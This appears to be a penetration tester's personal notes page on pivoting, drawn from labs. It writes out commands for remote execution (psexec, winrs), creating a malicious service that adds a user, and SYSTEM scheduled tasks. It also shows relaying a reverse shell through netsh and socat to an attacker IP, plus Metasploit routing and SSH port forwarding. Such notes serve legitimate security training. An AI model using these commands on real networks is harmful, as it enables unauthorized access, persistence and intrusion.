<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta https-equiv="content-type" content=
  "text/html; charset=UTF-8">
  <title>Pivoting</title>
  <meta name="viewport" content=
  "initial-scale=1.0, maximum-scale=1.0, width=device-width">
  <meta name="description" content=
  "My notes from various labs and certs.">
  <meta name="robots" content="index, follow">
  <meta property="og:url" content="https://eli2k.com/">
  <meta property="og:type" content="article">
  <meta property="og:title" content="Home">
  <meta property="og:description" content="Home">
  <meta property="og:image" content=
  "https://eli2k.com/resources/images/homepage.png">
  <link rel="stylesheet" href=
  "https://eli2k.com/resources/css/style.css">
  <link rel="icon" href=
  "https://eli2k.com/resources/images/bluscrn.gif" type=
  "image/gif">
  <link rel="stylesheet" href=
  "https://eli2k.com/resources/css/prism.css">
  <link rel="stylesheet" href=
  "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
  <input type="checkbox" class="theme-switch" id="theme-switch">
  <div id="page">
    <label for="theme-switch" class="switch-label"></label>
    <script src="https://eli2k.com/resources/js/prism.js"></script>
    
    <script>

    NekoType = "robot"
    </script>
    <h1 id="nl">
    <script src=
    "https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a></h1>
    <div id="container">
      <div id="header">
        <div class="text-container">
          <span>E</span> <span>L</span> <span>I</span> <span>2</span> <span>K</span>
        </div>
      </div>
      <div id="left-sidebar"></div>
      <div class="divider"></div>
      <div class="pageContent">
        <div class="nav border">
          <ul>
            <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
              <li>Home
              </li>
            </a>
            <a href="https://eli2k.com/about.html" title="A quick about me page">
              <li>About
              </li>
            </a>
            <a href="https://eli2k.com/sitemap.html" title="Where do you want to go">
              <li>Sitemap
              </li>
            </a>
            <a href="https://github.com/Eli2k765" title="My Github.">
              <li>Github
              </li>
            </a>
          </ul>
        </div>
        <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
          <div class="box">
            <div class="inner-box-content">
              <div class="article-wrapper">
                <h1>Routing and Tunneling</h1>
                <p class="alert">Moving between
                networks</p><strong>Last updated: May 4th, 2023</strong>
                <article>
                  <div id="contain">
                    <h3>Tooling</h3>
                    <div>
                      <ul>
                        <li>Psexec</li>
                        <ul>
                          <li>Ports 445</li>
                          <li>Administrator group required</li>
                          <li>Part of sysinternals</li>
                          <li>psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</li>
                        </ul>
                        <li>WinRM</li>
                        <ul>
                          <li>Ports 5985 or 5986 over HTTP</li>
                          <li>Remote Management Users group required</li>
                          <li>Usually enabled by default</li>
                          <li>winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</li>
                        </ul>
                        <li>sc</li>
                        <ul>
                          <li>Ports 135/TCP, 49152-65535/TCP (DCE/RPC) or 445/TCP (RPC over SMB Named Pipes) or 139/TCP (RPC over SMB Named Pipes)</li>
                          <li>Administrator group required</li>
                          <li>sc.exe \\TARGET create Malservice binPath= "net user John Pass123 /add" start= auto; sc.exe \\TARGET start Malservice</li>
                        </ul>
                        <li>schtasks</li>
                        <ul>
                          <li>schtasks /s TARGET /RU "SYSTEM" /create /tn "Maltask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00; schtasks /s TARGET /run /TN "Maltask1"</li>
                        </ul>
                      </ul>
                    </div>
                    <h3>Routing</h3>
                    <div>
                      <h4>Autoroute and proxychains</h4>
                      <div>
                        <p>I find the easiest way to set up a route is
                        to use Metasploits autoroute and then run
                        commands through proxychains. There are
                        limitations to proxychains you should be aware
                        of that are listed on its <a href=
                        "https://github.com/haad/proxychains#known-limitations-of-the-current-version"
                        target="_blank">Github</a>.</p>
                        <pre><code class=
                    "language-powershell">meterpreter&gt; run autoroute -s 255.255.255.0/24
ctrl-z
use socks_proxy
set version 4a
set SRVHOST OURIP
run
ctrl-z
echo "socks4        OURIP 1080" &gt;&gt; /etc/proxychains.conf
proxychains nmap -sn 255.255.255.0/24 #this will take a long time even though its only 256 hosts, but you can communicate now</code></pre>
                        <p>We can also use the ip command on linux to
                        do this</p>
                        <pre><code class=
                        "language-bash">ip route add 255.255.255.0/24 via 10.0.0.100 dev eth0</code></pre>
                      </div>
                    </div>
                    <h3>Tunneling</h3>
                    <div>
                      <h4>Scenario</h4>
                      <div>
                        <p>Imagine a scenario where there is a machine
                        running windows that prevents outbound
                        connections outside of its private network.
                        Trying to get a reverse shell is kind of a pain
                        unless you implement a tunnel from the target,
                        through a machine that can talk to you. Below
                        I'll show you can example where this is the
                        case.</p>
                        <pre><code class=
                        "language-powershell">netsh interface portproxy add v4tov4 listenaddress=MACHINEIP listenport=2765 connectaddress=OURIP connectport=2765</code></pre>
                        <p>This command will listen on 2765 for
                        incoming connections and forward it to our IP.
                        This assumes you have someway to make the
                        device that you're targeting make requests to
                        the machine running the commands. This socat
                        command does the same thing but for linux. You
                        can theoretically tunnel as many machines like
                        this as you need, as long as the ports match
                        up.</p>
                        <pre><code class=
                        "language-powershell"> socat TCP-LISTEN:2765,bind=MACHINEIP,fork,reuseaddr TCP:OURIP:2765&</code></pre>
                      </div>
                    </div>
                    <h3>Port Forwarding</h3>
                    <div>
                      <h4>Scenario</h4>
                      <div>
                        <p>What if you find a service that listens only
                        to local connections such as:</p><img src=
                        "https://eli2k.com/resources/images/127listeningservice.png">
                        <p>This would be good time to implement port
                        forwarding. I like using ssh for this, but I've
                        seen people use metasploit as well</p>
                        <pre><code class=
                      "language-bash">#ssh local port forward
##attacker
ssh -fNL 80:127.0.0.1:8989 user@pivot.com
##attacker
curl https://127.0.0.1:80
#You should get a response if it's a webserver

#metasploit
meterpreter&gt;portfwd add -l 80 -p 8989 -r target.com</code></pre>
                      </div>
                    </div>
                  </div>
                </article>
              </div>
            </div>
          </div>
        </div>
        <div class="footer border"></div>
      </div>
    </div>
    <script src=
    "https://eli2k.com/resources/js/themeSwitch.js"></script>
    <script src=
    "https://eli2k.com/resources/js/collapseList.js"></script>
    
  </div>
</body>
</html>
